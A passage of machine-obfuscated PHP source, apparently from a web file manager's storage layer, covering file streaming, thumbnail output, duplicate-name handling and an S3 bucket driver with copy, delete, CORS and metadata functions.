$this->getContent($cç‚ÔÀãÅÛ); $eØ˜ãÖëå¤ = Html::clearSVG($eØ˜ãÖëå¤); header($Cµ‚íö­»Ò[151] . strlen($eØ˜ãÖëå¤)); echo $eØ˜ãÖëå¤; die; } goto E‰¾Š‹‰Â†; CÍ› Ã´©: header($Cµ‚íö­»Ò[145] . $c‘¾«„ˆÍÄ . $Cµ‚íö­»Ò[137]); header($Cµ‚íö­»Ò[146] . $B¨ñÄ˜µìÁ); header($Cµ‚íö­»Ò[147]); goto CİÂ÷‡§›; Bª¶±§Ñ§š: if ($BÅ±‡±á¢) { $cÜÏÚ©¬‹Ô = intval(1000 * 1000 * ($D´½ˆßòá / $BÅ±‡±á¢)); } while ($E´ö¢äîÓõ <= $Bíª·Ë…±ö) { $BŸ³Ë ¨‘ˆ = timeFloat(); check_abort(); $dÄæÙëÖ = $Bíª·Ë…±ö - $E´ö¢äîÓõ + 1; if ($dÄæÙëÖ <= $D´½ˆßòá) { $D´½ˆßòá = $dÄæÙëÖ; } echo $this->fileSubstr($cç‚ÔÀãÅÛ, $E´ö¢äîÓõ, $D´½ˆßòá); $E´ö¢äîÓõ += $D´½ˆßòá; if ($D´½ˆßòá == $dÄæÙëÖ) { $E´ö¢äîÓõ = $Bíª·Ë…±ö + 1; } if ($cÜÏÚ©¬‹Ô) { $aÔŞçÉ±¤Õ = intval(1000 * 1000 * (timeFloat() - $BŸ³Ë ¨‘ˆ)); $B¼¬Œ¡ï¦Ï = $cÜÏÚ©¬‹Ô - $aÔŞçÉ±¤Õ; if ($B¼¬Œ¡ï¦Ï > 5) { usleep($B¼¬Œ¡ï¦Ï); } } } goto aÛ¯ÀŞ´Â ; D±ˆÎéâ: header($Cµ‚íö­»Ò[138]); header($Cµ‚íö­»Ò[139]); header($Cµ‚íö­»Ò[140]); goto Cè«ëÅˆ¹; BéŸÄÕÇ’: $Añ‹Ü©øò÷ = $this->getType() == $Cµ‚íö­»Ò[116]; $fªÍÅÔ»’Õ = $GLOBALS[$Cµ‚íö­»Ò[6]][$Cµ‚íö­»Ò[98]][$Cµ‚íö­»Ò[117]][$Cµ‚íö­»Ò[118]]; $BÅ±‡±á¢ = (double) $GLOBALS[$Cµ‚íö­»Ò[6]][$Cµ‚íö­»Ò[98]][$Cµ‚íö­»Ò[117]][$Cµ‚íö­»Ò[119]] * 1024 * 1024; goto A É Í¼‹–; C«ëÍïÃ¾«: header($Cµ‚íö­»Ò[130]); header($Cµ‚íö­»Ò[131] . $D¦Ê¥¸Ûî); $CÍ¢Í§ßĞâ = rawurlencode($B¨ñÄ˜µìÁ); goto FŞ—©“íÃí; Fã¶ß¬‚÷: $Cöêæ®¯†„ = !0; if ($_SERVER[$Cµ‚íö­»Ò[164]] == $Cµ‚íö­»Ò[165] && $eØ‰ÀÂÅÔ´ > 1204 * 1024 * 1024 * 2) { $Cöêæ®¯†„ = !1; } if ($Cöêæ®¯†„) { header($Cµ‚íö­»Ò[166] . ($Bíª·Ë…±ö - $E´ö¢äîÓõ + 1)); } goto a†”•ö´õ²; Dï‹ËÚñê•: $D¦Ê¥¸Ûî = get_file_mime($e¤‹Œ‘íº); if (strstr($D¦Ê¥¸Ûî, $Cµ‚íö­»Ò[127])) { $D¦Ê¥¸Ûî = $D¦Ê¥¸Ûî . $Cµ‚íö­»Ò[128]; } if ($a¬Õ”¼ Ùë === !1 && !mime_support($D¦Ê¥¸Ûî)) { $a¬Õ”¼ Ùë = !0; $D¦Ê¥¸Ûî = $Cµ‚íö­»Ò[129]; } goto C«ëÍïÃ¾«; Eâ„ãÍå®à: $eØ‰ÀÂÅÔ´ = $BŒÖÑíŸìé[$Cµ‚íö­»Ò[88]]; $c‘¾«„ˆÍÄ = gmdate($Cµ‚íö­»Ò[120], $BŒÖÑíŸìé[$Cµ‚íö­»Ò[94]]); $B¨ñÄ˜µìÁ = $DíÑ»¦‰„ ? $DíÑ»¦‰„ : $this->iconvApp($BŒÖÑíŸìé[$Cµ‚íö­»Ò[28]]); goto C´¿Œ†í…Ï; ešÅ¯”ìğí: if (in_array($e¤‹Œ‘íº, array($Cµ‚íö­»Ò[121], $Cµ‚íö­»Ò[122], $Cµ‚íö­»Ò[123], $Cµ‚íö­»Ò[124]))) { $e¤‹Œ‘íº = $Cµ‚íö­»Ò[125]; } if (!$cÃƒï³¸êÁ) { $cÃƒï³¸êÁ = md5($c‘¾«„ˆÍÄ . $this->hashSimple($cç‚ÔÀãÅÛ)); } $cÃƒï³¸êÁ = $Cµ‚íö­»Ò[126] . $cÃƒï³¸êÁ . $Cµ‚íö­»Ò[126]; goto Dï‹ËÚñê•; aÛ¯ÀŞ´Â : } public function fileOutServer($AËæ¾“÷, $CÆ§ÕÛ÷µ“ = false, $c‚º–œ±¼ = false, $F×‹†±ù‘‹ = '') { $this->fileOut($AËæ¾“÷, $CÆ§ÕÛ÷µ“, $c‚º–œ±¼, $F×‹†±ù‘‹); } public function fileOutLink($Aä˜ğŞö½) { header($_SERVER[Ü˜][169] . $Aä˜ğŞö½); die; } public function cacheMethod($b™©Ó¤Ÿ·¾, $AÉÍ¿¬¼ Š, $aÜ’Û³í’¦ = null) { goto DÕ­ğ±©Ú; eŞô‚ÜáäÁ: $C‹Èƒäíïª = $C°çÂ¯¦Í˜[170] . $b™©Ó¤Ÿ·¾ . $C°çÂ¯¦Í˜[171] . rtrim($f˜¸–”êÅª, $C°çÂ¯¦Í˜[8]); if (is_null($b™©Ó¤Ÿ·¾)) { $dÖ†ÉˆÄœ = array(); return; } if (is_null($AÉÍ¿¬¼ Š)) { unset($dÖ†ÉˆÄœ[$C‹Èƒäíïª]); return; } goto E—Õó‚µïñ; E—Õó‚µïñ: if (!is_null($aÜ’Û³í’¦)) { $dÖ†ÉˆÄœ[$C‹Èƒäíïª] = $aÜ’Û³í’¦; return; } $A¥©…ßøÅ­ = isset($dÖ†ÉˆÄœ[$C‹Èƒäíïª]) ? $dÖ†ÉˆÄœ[$C‹Èƒäíïª] : null; if (!is_null($A¥©…ßøÅ­)) { return $A¥©…ßøÅ­; } goto EÍª™Ô ; EÍª™Ô : $A¥©…ßøÅ­ = $this->{$b™©Ó¤Ÿ·¾}($AÉÍ¿¬¼ Š); $dÖ†ÉˆÄœ[$C‹Èƒäíïª] = $A¥©…ßøÅ­; return $A¥©…ßøÅ­; goto E‘‘êö® æ; DÕ­ğ±©Ú: $C°çÂ¯¦Í˜ =& $_SERVER[Ü˜]; static $dÖ†ÉˆÄœ = array(); $f˜¸–”êÅª = $AÉÍ¿¬¼ Š ? ltrim($this->getPathOuter($AÉÍ¿¬¼ Š), $C°çÂ¯¦Í˜[8]) : $AÉÍ¿¬¼ Š; goto eŞô‚ÜáäÁ; E‘‘êö® æ: } public function fileOutImage($cÚí¥ˆã‘³, $dÁƒä·’‚  = 250) { goto EÀ±»Ô±í; b¨¢–ÏŒºÀ: if (isset($GLOBALS[$b‰ö²¸ƒ·É[172]]) && $GLOBALS[$b‰ö²¸ƒ·É[172]][$b‰ö²¸ƒ·É[86]] == $bšÚíŠÓ[$b‰ö²¸ƒ·É[86]]) { $D¹¡ŒÆ·¿Ê = $GLOBALS[$b‰ö²¸ƒ·É[172]][$b‰ö²¸ƒ·É[173]]; if (!$bšÚíŠÓ[$b‰ö²¸ƒ·É[174]]) { $bšÚíŠÓ[$b‰ö²¸ƒ·É[174]] = $GLOBALS[$b‰ö²¸ƒ·É[172]]; } if (isset($D¹¡ŒÆ·¿Ê[$b‰ö²¸ƒ·É[175]])) { if ($D¹¡ŒÆ·¿Ê[$b‰ö²¸ƒ·É[175]] <= $dÁƒä·’‚  && $D¹¡ŒÆ·¿Ê[$b‰ö²¸ƒ·É[176]] <= $dÁƒä·’‚ ) { $BÊÊá¶ó  = !0; } } $DîâÙ¡ë© = $bšÚíŠÓ[$b‰ö²¸ƒ·É[174]][$b‰ö²¸ƒ·É[28]]; } if ($bšÚíŠÓ[$b‰ö²¸ƒ·É[88]] <= 1024 * 50 || $BÊÊá¶ó  || !function_exists($b‰ö²¸ƒ·É[177]) || $bšÚíŠÓ[$b‰ö²¸ƒ·É[178]] == $b‰ö²¸ƒ·É[179]) { return $this->fileOut($cÚí¥ˆã‘³, !1, $DîâÙ¡ë©); } if (isset($bšÚíŠÓ[$b‰ö²¸ƒ·É[174]][$b‰ö²¸ƒ·É[180]])) { $a¬’Æ²÷Ğ = $bšÚíŠÓ[$b‰ö²¸ƒ·É[174]][$b‰ö²¸ƒ·É[180]]; } else { if (isset($bšÚíŠÓ[$b‰ö²¸ƒ·É[174]][$b‰ö²¸ƒ·É[181]])) { $a¬’Æ²÷Ğ = $bšÚíŠÓ[$b‰ö²¸ƒ·É[174]][$b‰ö²¸ƒ·É[181]]; } else { $a¬’Æ²÷Ğ = md5("{$bšÚíŠÓ[$b‰ö²¸ƒ·É[28]]}\x5f{$bšÚíŠÓ[$b‰ö²¸ƒ·É[86]]}\137{$bšÚíŠÓ[$b‰ö²¸ƒ·É[88]]}"); } } goto DùùÆ×Ö¤Â; d˜°ˆÍëÎƒ: if (!is_dir(DATA_THUMB)) { mk_dir(DATA_THUMB); } $CŞõ›˜ô“ = DATA_THUMB . $eïñç×Âƒ; del_file($CŞõ›˜ô“); goto F¹Æ¹¥ª¶; F¹Æ¹¥ª¶: if (!@file_exists($CŞõ›˜ô“)) { $FËó¤ ¦Õ = TEMP_FILES; if (!is_dir($FËó¤ ¦Õ)) { mk_dir($FËó¤ ¦Õ); } $Dˆ²ÏÔéÖ = $FËó¤ ¦Õ . $a¬’Æ²÷Ğ . $b‰ö²¸ƒ·É[105] . $bšÚíŠÓ[$b‰ö²¸ƒ·É[178]]; if (!@file_exists($Dˆ²ÏÔéÖ)) { $Dˆ²ÏÔéÖ = $this->download($cÚí¥ˆã‘³, $Dˆ²ÏÔéÖ); } ImageThumb::createThumb($Dˆ²ÏÔéÖ, $CŞõ›˜ô“, $dÁƒä·’‚ , $dÁƒä·’‚  * 10); } if (!file_exists($CŞõ›˜ô“) || filesize($CŞõ›˜ô“) < 100) { return @file_exists($Dˆ²ÏÔéÖ) ? IO::fileOut($Dˆ²ÏÔéÖ) : $this->fileOut($cÚí¥ˆã‘³); } if (!($C¾ËæìÔó = IO::move($CŞõ›˜ô“, $bÛƒÊôÑÒ))) { return IO::fileOut($CŞõ›˜ô“); } goto c“·ïğ‡Ğ; BÎëÅİ²ô: $bšÚíŠÓ = $this->info($cÚí¥ˆã‘³); $DîâÙ¡ë© = $bšÚíŠÓ[$b‰ö²¸ƒ·É[28]]; $BÊÊá¶ó  = !1; goto b¨¢–ÏŒºÀ; DùùÆ×Ö¤Â: $eïñç×Âƒ = "{$a¬’Æ²÷Ğ}\x5f{$dÁƒä·’‚ }\56\x70\156\147"; if (!($C…„á‡‡ƒ¶ = IO::fileNameExist(IO_PATH_SYSTEM_TEMP, $b‰ö²¸ƒ·É[182]))) { $bÛƒÊôÑÒ = IO::mkdir(IO_PATH_SYSTEM_TEMP . $b‰ö²¸ƒ·É[183]); } else { $bÛƒÊôÑÒ = KodIO::make($C…„á‡‡ƒ¶); } if ($C…„á‡‡ƒ¶ = IO::fileNameExist($bÛƒÊôÑÒ, $eïñç×Âƒ)) { $CŞõ›˜ô“ = KodIO::make($C…„á‡‡ƒ¶); return IO::fileOut($CŞõ›˜ô“, !1, $DîâÙ¡ë©); } goto d˜°ˆÍëÎƒ; EÀ±»Ô±í: $b‰ö²¸ƒ·É =& $_SERVER[Ü˜]; set_timeout(); if (substr($cÚí¥ˆã‘³, 0, 4) == $b‰ö²¸ƒ·É[157]) { $this->fileOutLink($cÚí¥ˆã‘³); } goto BÎëÅİ²ô; c“·ïğ‡Ğ: del_file($CŞõ›˜ô“); IO::fileOut($C¾ËæìÔó); goto D‹àÙÄ‹ƒ; D‹àÙÄ‹ƒ: } public function fileOutImageServer($B…‚ñª’º, $aØŠäŸ¬Á“ = 250) { $this->fileOutImage($B…‚ñª’º, $aØŠäŸ¬Á“); } public function fileNameAuto($E¸“…¢Ãˆš, $a’à…ç—¸Û, $cùƒäôÙˆ = REPEAT_RENAME, $cÕè¬Ó¢Å§ = false) { goto fÍŒ‘ôÓ±ß; fÍŒ‘ôÓ±ß: $D¼Œ‡Á³Ò— =& $_SERVER[Ü˜]; $aâ“‚àÈõ = $E¸“…¢Ãˆš === $D¼Œ‡Á³Ò—[33] ? $a’à…ç—¸Û : rtrim($E¸“…¢Ãˆš, $D¼Œ‡Á³Ò—[8]) . $D¼Œ‡Á³Ò—[8] . $a’à…ç—¸Û; if ($cùƒäôÙˆ == REPEAT_REPLACE || !$this->exist($aâ“‚àÈõ) || $cÕè¬Ó¢Å§ && $cùƒäôÙˆ != REPEAT_RENAME_FOLDER) { return $a’à…ç—¸Û; } goto Bá«¹¾×Ï¥; C†š‡ª¯™Ç: $e®œô•Îíƒ = 1; $C˜æ¢˜ƒùĞ = substr($a’à…ç—¸Û, 0, strlen($a’à…ç—¸Û) - strlen($f¡¾Åğ·éº)); $fß­ ÈŸ‘Ş = $C˜æ¢˜ƒùĞ . "\x28{$e®œô•Îíƒ}\x29{$f¡¾Åğ·éº}"; goto F‘àõÀ‡ëÊ; Bá«¹¾×Ï¥: if ($cùƒäôÙˆ == REPEAT_SKIP) { return !1; } $f¡¾Åğ·éº = $D¼Œ‡Á³Ò—[105] . get_path_ext($a’à…ç—¸Û); $f¡¾Åğ·éº = $f¡¾Åğ·éº == $D¼Œ‡Á³Ò—[105] || $cÕè¬Ó¢Å§ ? $D¼Œ‡Á³Ò—[33] : $f¡¾Åğ·éº; goto C†š‡ª¯™Ç; F‘àõÀ‡ëÊ: while ($this->exist(rtrim($E¸“…¢Ãˆš, $D¼Œ‡Á³Ò—[8]) . $D¼Œ‡Á³Ò—[8] . $fß­ ÈŸ‘Ş)) { $fß­ ÈŸ‘Ş = $C˜æ¢˜ƒùĞ . "\50{$e®œô•Îíƒ}\x29{$f¡¾Åğ·éº}"; $e®œô•Îíƒ++; } return $fß­ ÈŸ‘Ş; goto BÚ·«á±“Î; BÚ·«á±“Î: } private function fileNameAutoList($e «¨§’Â, $eš˜ÚõÑù¡, $f‰¦šÄÜš’ = false) { goto b”àËùÑ˜; f¾ĞËÂ‘î: $aòˆñæ±ª = substr($eš˜ÚõÑù¡, 0, strlen($eš˜ÚõÑù¡) - strlen($eÜãŒÒŒ©)); $FÔ•æà†ÂÃ = $aòˆñæ±ª . "\50\60\x29{$eÜãŒÒŒ©}"; for ($fî‰“ïä†í = 1; $fî‰“ïä†í <= count($eœ¬ºí‚©) + 1; $fî‰“ïä†í++) { $FÔ•æà†ÂÃ = $aòˆñæ±ª . "\x28{$fî‰“ïä†í}\x29{$eÜãŒÒŒ©}"; if (!in_array_not_case($FÔ•æà†ÂÃ, $eœ¬ºí‚©)) { return $FÔ•æà†ÂÃ; } } goto AÔˆÓµíÄù; b”àËùÑ˜: $Dì‚¹¾¸„ =& $_SERVER[Ü˜]; $AÂ‘ªõŒå¯ = $this->listPath($e «¨§’Â, !0); $AÂ‘ªõŒå¯ = array_merge($AÂ‘ªõŒå¯[$Dì‚¹¾¸„[85]], $AÂ‘ªõŒå¯[$Dì‚¹¾¸„[84]]); goto a˜‹äÎ®·; AÔˆÓµíÄù: return $FÔ•æà†ÂÃ; goto DğƒÂîá§ˆ; a˜‹äÎ®·: $eœ¬ºí‚© = array_to_keyvalue($AÂ‘ªõŒå¯, $Dì‚¹¾¸„[33], $Dì‚¹¾¸„[28]); $eÜãŒÒŒ© = $Dì‚¹¾¸„[105] . get_path_ext($eš˜ÚõÑù¡); $eÜãŒÒŒ© = $eÜãŒÒŒ© == $Dì‚¹¾¸„[105] || $f‰¦šÄÜš’ ? $Dì‚¹¾¸„[33] : $eÜãŒÒŒ©; goto f¾ĞËÂ‘î; DğƒÂîá§ˆ: } public function listAllFiles($C¿¨é³¦İ›, $Fî¾ëãèÄ¾, $eğò”£¨§Ô = array()) { goto d‡¦¹±¾™; E×„”Û•è: $C¿¨é³¦İ› = trim($C¿¨é³¦İ›, $A·Â¡ÕŸˆë[8]); foreach ($Fî¾ëãèÄ¾ as $BîŠ÷ÊÒ„Ø) { $FŒàõ¦çÌ° = ltrim(substr(trim($BîŠ÷ÊÒ„Ø, $A·Â¡ÕŸˆë[8]), strlen($C¿¨é³¦İ›)), $A·Â¡ÕŸˆë[8]); $e“›óŠ×¢“ = array_merge($e“›óŠ×¢“, $this->slicePath($FŒàõ¦çÌ°)); } $eÖáØ‡êÍ = array(); goto e˜ù®‚ë–ê; d‡¦¹±¾™: $A·Â¡ÕŸˆë =& $_SERVER[Ü˜]; if (empty($Fî¾ëãèÄ¾)) { return array(); } $e“›óŠ×¢“ = array(); goto E×„”Û•è; e˜ù®‚ë–ê: foreach (array_unique($e“›óŠ×¢“) as $BîŠ÷ÊÒ„Ø) { $eÖÁÅ—ßİÊ = array($A·Â¡ÕŸˆë[86] => $this->getPathOuter($A·Â¡ÕŸˆë[8] . $C¿¨é³¦İ› . $A·Â¡ÕŸˆë[8] . $BîŠ÷ÊÒ„Ø), $A·Â¡ÕŸˆë[87] => 1, $A·Â¡ÕŸˆë[88] => 0); if (substr($BîŠ÷ÊÒ„Ø, -1) != $A·Â¡ÕŸˆë[8]) { $eÖÁÅ—ßİÊ[$A·Â¡ÕŸˆë[87]] = 0; $c¾Ò¦ÆÕª = $this->getPath($C¿¨é³¦İ› . $A·Â¡ÕŸˆë[8] . $BîŠ÷ÊÒ„Ø); $eÖÁÅ—ßİÊ[$A·Â¡ÕŸˆë[88]] = isset($eğò”£¨§Ô[$c¾Ò¦ÆÕª]) ? $eğò”£¨§Ô[$c¾Ò¦ÆÕª] : $this->size($c¾Ò¦ÆÕª); } $eÖáØ‡êÍ[] = $eÖÁÅ—ßİÊ; } return $eÖáØ‡êÍ; goto a±ëÉ×…à; a±ëÉ×…à: } public function slicePath($b Ï­ğô) { $b‘¤™’ÁĞ› =& $_SERVER[Ü˜]; $EÙÀÇàé½ô = explode($b‘¤™’ÁĞ›[8], trim($b Ï­ğô, $b‘¤™’ÁĞ›[8])); $C±îª—ÛÜ = 0; do { ++$C±îª—ÛÜ; $A¹„øÙñæ¥[] = implode($b‘¤™’ÁĞ›[8], array_slice($EÙÀÇàé½ô, 0, $C±îª—ÛÜ)) . $b‘¤™’ÁĞ›[8]; } while ($C±îª—ÛÜ < count($EÙÀÇàé½ô)); $A¹„øÙñæ¥[count($EÙÀÇàé½ô) - 1] = $b Ï­ğô; return $A¹„øÙñæ¥; } public function getHost() { $EñĞÖ‡¬À¡ =& $_SERVER[Ü˜]; $f¾‰»’Å©‰ = parse_url(trim($this->domain, $EñĞÖ‡¬À¡[8])); $dƒõ†è³‘ƒ = isset($f¾‰»’Å©‰[$EñĞÖ‡¬À¡[184]]) ? $f¾‰»’Å©‰[$EñĞÖ‡¬À¡[184]] : http_type(); $E­Ü²µ®á = isset($f¾‰»’Å©‰[$EñĞÖ‡¬À¡[185]]) ? $f¾‰»’Å©‰[$EñĞÖ‡¬À¡[185]] : $f¾‰»’Å©‰[$EñĞÖ‡¬À¡[86]]; if (isset($f¾‰»’Å©‰[$EñĞÖ‡¬À¡[186]])) { $E­Ü²µ®á .= $EñĞÖ‡¬À¡[4] . $f¾‰»’Å©‰[$EñĞÖ‡¬À¡[186]]; } return $dƒõ†è³‘ƒ . $EñĞÖ‡¬À¡[187] . $E­Ü²µ®á; } public function pathEncode($EƒùŒ¹æ) { $c’äØğ±ŒÈ =& $_SERVER[Ü˜]; return str_replace($c’äØğ±ŒÈ[188], $c’äØğ±ŒÈ[8], rawurlencode($EƒùŒ¹æ)); } } class PathDriverBaseS3 extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $useSSL = false; protected $region = ''; protected $endpoint = ''; protected $bucket = ''; protected $client = null; protected $signVer = "\x76\x34"; public $ioUploadServer = "\x30"; public $ioFileOutServer = "\60"; public function __construct($f’ì­¶Èñ) { set_timeout(); require_once SDK_DIR . $_SERVER[Ü˜][189]; parent::__construct(); $this->_init($f’ì­¶Èñ); } public function _init($Cåâê¤–Ş ) { foreach ($Cåâê¤–Ş  as $cÀ‚Ù¹š¨ => $b¹ÔÓÕØó) { if (isset($this->{$cÀ‚Ù¹š¨})) { $this->{$cÀ‚Ù¹š¨} = $b¹ÔÓÕØó; } } $this->endpoint = $Cåâê¤–Ş [$_SERVER[Ü˜][190]]; $this->client = new S3($this->accessKey, $this->secret, $this->useSSL, $this->endpoint, $this->region); $this->client->setEndpoint($this->getHost()); } public function signatureVersion($a›Ú·°…âŞ = "\166\x34") { $this->signVer = $a›Ú·°…âŞ; $this->client->setSignatureVersion($a›Ú·°…âŞ); } public function setBucketCors() { return $this->client->setBucketCors($this->bucket); } public function getBucketCors() { return $this->client->getBucketCors($this->bucket); } public function isBucketCors() { goto b¥Š â¼¾; b¥Š â¼¾: $aøÊ­‰èÀˆ =& $_SERVER[Ü˜]; $E¹º—ÕÀæ = $this->getBucketCors(); if (!$E¹º—ÕÀæ || !is_array($E¹º—ÕÀæ)) { return !1; } goto CËÎ¡øÜø†; bÀÈáØõ†‹: $fñçöİ£·Á = array($aøÊ­‰èÀˆ[196], $aøÊ­‰èÀˆ[197], $aøÊ­‰èÀˆ[198], $aøÊ­‰èÀˆ[199], $aøÊ­‰èÀˆ[200]); $F·¼Äª® = array_diff($fñçöİ£·Á, $a»éô‚½¦ƒ); return empty($F·¼Äª®); goto Cçƒòí×„; CËÎ¡øÜø†: if ($E¹º—ÕÀæ[$aøÊ­‰èÀˆ[191]] != $aøÊ­‰èÀˆ[192] || $E¹º—ÕÀæ[$aøÊ­‰èÀˆ[193]] != $aøÊ­‰èÀˆ[192]) { return !1; } $a»éô‚½¦ƒ = array_map($aøÊ­‰èÀˆ[194], $E¹º—ÕÀæ[$aøÊ­‰èÀˆ[195]]); if (!is_array($a»éô‚½¦ƒ)) { $a»éô‚½¦ƒ = array(); } goto bÀÈáØõ†‹; Cçƒòí×„: } public function mkfile($d˜æ»Üéº, $b«Ûç¯§· = '', $eé áŠ²äŞ = REPEAT_RENAME) { $C‡ùƒÓÊº = $this->setContent($d˜æ»Üéº, $b«Ûç¯§·); if ($C‡ùƒÓÊº !== !1) { return $this->getPathOuter($d˜æ»Üéº); } return !1; } public function mkdir($Dƒï»÷™äã, $F¦Û´©œÉÕ = REPEAT_SKIP) { $Eêç¬Öã— =& $_SERVER[Ü˜]; if (empty($Dƒï»÷™äã) && $Dƒï»÷™äã !== $Eêç¬Öã—[201]) { return !1; } if ($this->_isFolder($Dƒï»÷™äã)) { return $this->getPathOuter($Dƒï»÷™äã); } $eîèŠ¬–ØÑ = $this->setContent($Dƒï»÷™äã, $Eêç¬Öã—[33], !0); if ($eîèŠ¬–ØÑ !== !1) { return $this->getPathOuter($Dƒï»÷™äã); } return !1; } public function copyFile($D“®èà’ÓÍ, $A†ÚĞøõµä, $d½­À¾×£ = array()) { $FóÖ©í”À§ =& $_SERVER[Ü˜]; $E„ÆÇŒ—ƒ‚ = $this->objectMeta($D“®èà’ÓÍ); if (!$E„ÆÇŒ—ƒ‚) { return !1; } if ($E„ÆÇŒ—ƒ‚[$FóÖ©í”À§[88]] <= 1024 * 1024 * 200) { $fÍçÄôÅ×¤ = $this->client->copyObject($this->bucket, $D“®èà’ÓÍ, $this->bucket, $A†ÚĞøõµä, $FóÖ©í”À§[202], $d½­À¾×£); } else { $fÍçÄôÅ×¤ = $this->client->multiCopyObject($this->bucket, $D“®èà’ÓÍ, $this->bucket, $A†ÚĞøõµä, $d½­À¾×£); } $fÍçÄôÅ×¤ = $fÍçÄôÅ×¤ ? $this->getPathOuter($A†ÚĞøõµä) : !1; return $fÍçÄôÅ×¤; } public function moveFile($F°ßÛìíïĞ, $dŠî°Á†¡Ü) { if ($this->copyFile($F°ßÛìíïĞ, $dŠî°Á†¡Ü)) { $this->delFile($F°ßÛìíïĞ); return $this->getPathOuter($dŠî°Á†¡Ü); } return !1; } public function delFile($CäÉë—¼¥­) { return $this->client->deleteObject($this->bucket, $CäÉë—¼¥­); } public function delFolder($B‹åİ¹…Êì) { goto F›äøŸ¾¢; dğ³‘È¦š: if (!empty($B‹åİ¹…Êì) && $B‹åİ¹…Êì !== $C‘ˆ¨İÖò†[201] && !in_array($e›Ì³ºØ­ö, $B…ï”¹Ëñ[$C‘ˆ¨İÖò†[85]])) { $B…ï”¹Ëñ[$C‘ˆ¨İÖò†[85]][] = $e›Ì³ºØ­ö; } $c›¥¢”Òè¦ = $this->delByBatch($B…ï”¹Ëñ[$C‘ˆ¨İÖò†[84]]); if (!$c›¥¢”Òè¦) { return !1; } goto E‘ã¦ŠâÆ; A«¢¬ºİÕÄ: $B…ï”¹Ëñ = $this->fileList($B‹åİ¹…Êì); $this->listItemCache = !0; $e›Ì³ºØ­ö = trim($B‹åİ¹…Êì, $C‘ˆ¨İÖò†[8]) . $C‘ˆ¨İÖò†[8]; goto dğ³‘È¦š; E‘ã¦ŠâÆ: $c›¥¢”Òè¦ = $this->delByBatch($B…ï”¹Ëñ[$C‘ˆ¨İÖò†[85]]); if (!$c›¥¢”Òè¦) { return !1; } return $this->delFile($e›Ì³ºØ­ö); goto C¼‰™ÏªÜ; F›äøŸ¾¢: $C‘ˆ¨İÖò† =& $_SERVER[Ü˜]; if (!$this->exist($B‹åİ¹…Êì)) { return !0; } $this->listItemCache = !1; goto A«¢¬ºİÕÄ; C¼‰™ÏªÜ: } private function delByBatch($cëî„‘öõ) { foreach (array_chunk($cëî„‘öõ, 1000) as $bÌèƒ–ßê) { $DÍâã‚Ï­ = $this->client->deleteObjects($this->bucket, $bÌèƒ–ßê); if (!$DÍâã‚Ï­) { return !1; } } return !0; } public function rename($fœ¯ÛŠ¿¥Á, $fŸ×µŒË½) { return $this->renameObject($fœ¯ÛŠ¿¥Á, $fŸ×µŒË½); } public function listPath($aøÒñÃÂš—, $C¥òÙÈ´®Ù = false) { $fÁåãë·ğÂ =& $_SERVER[Ü˜]; $E¡ÏŸº‹µà = $this->fileList($aøÒñÃÂš—, $fÁåãë·ğÂ[8], !0); foreach ($E¡ÏŸº‹µà[$fÁåãë·ğÂ[85]] as $b—î‚ŠŠ => $FŒÒ§˜ªñÍ) { $E¡ÏŸº‹µà[$fÁåãë·ğÂ[85]][$b—î‚ŠŠ] = $this->folderInfo($FŒÒ§˜ªñÍ, $C¥òÙÈ´®Ù); } foreach ($E¡ÏŸº‹µà[$fÁåãë·ğÂ[84]] as $b—î‚ŠŠ => $FŒÒ§˜ªñÍ) { $E¡ÏŸº‹µà[$fÁåãë·ğÂ[84]][$b—î‚ŠŠ] = $this->fileInfo($FŒÒ§˜ªñÍ[$fÁåãë·ğÂ[28]], $C¥òÙÈ´®Ù, $FŒÒ§˜ªñÍ); } return $E¡ÏŸº‹µà; } private function fileInfo($Fš¯Í¼Ú³Ê, $fâêàÙÎĞ = false, $ağ”éìÄ¥‡ = array()) { goto d×ôÏÃ ò; b‡ï÷†Ïó¨: if (isset($ağ”éìÄ¥‡[$BÒğì‘—šğ[207]])) { $dÊÅƒ†‹‚á[$BÒğì‘—šğ[94]] = $ağ”éìÄ¥‡[$BÒğì‘—šğ[207]]; } if (isset($ağ”éìÄ¥‡[$BÒğì‘—šğ[88]])) { $dÊÅƒ†‹‚á[$BÒğì‘—šğ[88]] = $ağ”éìÄ¥‡[$BÒğì‘—šğ[88]]; } return $dÊÅƒ†‹‚á; goto BòÏäŸ­¿ˆ; eùØ¦ˆÑÀÏ: $dÊÅƒ†‹‚á[$BÒğì‘—šğ[204]] = $dÊÅƒ†‹‚á[$BÒğì‘—šğ[94]] = 0; $dÊÅƒ†‹‚á[$BÒğì‘—šğ[205]] = $dÊÅƒ†‹‚á[$BÒğì‘—šğ[206]] = !0; if (empty($ağ”éìÄ¥‡)) { $ağ”éìÄ¥‡ = $this->objectMeta($Fš¯Í¼Ú³Ê); if (!$ağ”éìÄ¥‡) { return $dÊÅƒ†‹‚á; } } goto b‡ï÷†Ïó¨; d×ôÏÃ ò: $BÒğì‘—šğ =& $_SERVER[Ü˜]; $dÊÅƒ†‹‚á = array($BÒğì‘—šğ[28] => $this->pathThis($Fš¯Í¼Ú³Ê), $BÒğì‘—šğ[86] => $this->getPathOuter($Fš¯Í¼Ú³Ê), $BÒğì‘—šğ[29] => $BÒğì‘—šğ[203], $BÒğì‘—šğ[178] => $this->ext($Fš¯Í¼Ú³Ê), $BÒğì‘—šğ[88] => isset($ağ”éìÄ¥‡[$BÒğì‘—šğ[88]]) ? $ağ”éìÄ¥‡[$BÒğì‘—šğ[88]] : 0); if ($fâêàÙÎĞ) { return $dÊÅƒ†‹‚á; } goto eùØ¦ˆÑÀÏ; BòÏäŸ­¿ˆ: } private function folderInfo($F™é†îÔóÑ, $AÕØ´ÜÚõ = false) { goto F¼ø¤ÄÈ’á; F”œšÅİÑ“: $F™é†îÔóÑ = trim($F™é†îÔóÑ, $A“èˆ‰Ä×ˆ[8]) . $A“èˆ‰Ä×ˆ[8]; $cæˆ¼Ã¨“ = $this->objectMeta($F™é†îÔóÑ); if (isset($cæˆ¼Ã¨“[$A“èˆ‰Ä×ˆ[207]])) { $A”ğÏé«ñ–[$A“èˆ‰Ä×ˆ[204]] = $cæˆ¼Ã¨“[$A“èˆ‰Ä×ˆ[207]]; } goto BÇÒ²’Áñ; CÒâÕ˜ÛŠœ: $A”ğÏé«ñ–[$A“èˆ‰Ä×ˆ[204]] = $A”ğÏé«ñ–[$A“èˆ‰Ä×ˆ[94]] = 0; $A”ğÏé«ñ–[$A“èˆ‰Ä×ˆ[205]] = $A”ğÏé«ñ–[$A“èˆ‰Ä×ˆ[206]] = !0; if ($F™é†îÔóÑ == 